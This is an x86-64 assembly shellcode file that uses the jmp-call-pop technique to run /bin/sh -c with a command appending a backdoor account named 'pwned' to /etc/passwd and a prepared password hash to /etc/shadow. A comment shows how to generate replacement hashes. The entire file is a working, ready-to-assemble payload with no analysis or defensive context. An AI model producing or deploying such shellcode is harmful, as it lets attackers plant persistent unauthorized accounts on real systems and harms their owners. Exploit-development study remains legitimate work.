global _start

_start:
    jmp short findaddress

_realstart:
    pop rdi
    push 0x5a
    pop rax
    lea rbx, [rdi + 8]
    lea rcx, [rdi + 11]
    xor byte [rbx-1], al     ; replace Z with null byte in "/bin/shZ"
    xor byte [rcx-1], al     ; same for "-cZ"

    cdq
    push rdx                 ; NULL
    push rcx                 ; command
    push rbx                 ; "-c"
    push rdi                 ; "/bin/sh"
    push rsp
    pop rsi
    mov al, 59               ; __NR_execve
    syscall

findaddress:
    call _realstart
    string : db "/bin/shZ-cZecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash>>/etc/passwd;echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::>>/etc/shadow"
    ; you can generate new hashes with:
    ; echo '$pass$' | openssl passwd -stdin -6 | sed -e 's/\$/\\$/g'
